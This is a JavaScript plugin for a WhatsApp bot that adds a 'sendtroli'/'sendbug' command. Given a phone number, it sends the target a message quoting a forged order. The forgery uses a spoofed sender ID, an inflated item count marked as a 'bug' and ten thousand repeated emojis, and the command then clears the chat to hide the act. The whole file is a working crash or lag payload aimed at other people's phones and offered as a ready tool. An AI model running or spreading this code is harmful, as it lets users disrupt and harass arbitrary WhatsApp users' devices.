// Dann Official
let handler = async (m, { conn, text, args, usedPrefix, command }) => {
if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} 62xxxxx`
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Hai Kak', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: '🔥'.repeat(10000),
    orderTitle: '2023 © Dann-MD', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
}).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
}
handler.help = ['sendbug <nomor>', 'sendtroli <nomor>']
handler.tags = ['tools']
handler.command = /^(sendtroli)$/i

handler.owner = false
handler.premium = true
handler.private = true
module.exports = handler